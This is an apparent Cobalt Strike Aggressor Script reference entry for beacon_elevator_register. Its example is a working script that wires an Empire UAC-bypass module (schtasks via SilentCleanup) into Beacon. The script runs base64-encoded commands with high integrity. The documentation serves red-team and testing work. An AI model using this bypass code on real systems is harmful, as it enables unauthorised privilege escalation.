beacon_elevator_register

Register a Beacon command elevator with Cobalt Strike. This adds an option to the **runasadmin** command.

#### Arguments

`$1` - the exploit short name

`$2` - a description of the exploit

`$3` - the function that implements the exploit ($1 is the Beacon ID, $2 the command and arguments)

#### Example

```
# Integrate schtasks.exe (via SilentCleanup) Bypass UAC attack
# Sourced from Empire: https://github.com/EmpireProject/Empire/tree/master/data/module_source/privesc
sub schtasks_elevator {
   local('$handle $script $oneliner $command');

   # acknowledge this command
   btask($1, "Tasked Beacon to execute $2 in a high integrity context", "T1088");

   # read in the script
   $handle = openf(getFileProper(script_resource("modules"), "Invoke-EnvBypass.ps1"));
   $script = readb($handle, -1);
   closef($handle);

   # host the script in Beacon
   $oneliner = beacon_host_script($1, $script);

   # base64 encode the command
   $command  = transform($2, "powershell-base64");

   # run the specified command via this exploit.
   bpowerpick!($1, "Invoke-EnvBypass -Command \" $+ $command $+ \"", $oneliner);
}

beacon_elevator_register("uac-schtasks", "Bypass UAC with schtasks.exe (via SilentCleanup)", &schtasks_elevator);```

See Also&beacon_elevator_describe, &beacon_elevators, &belevate_command

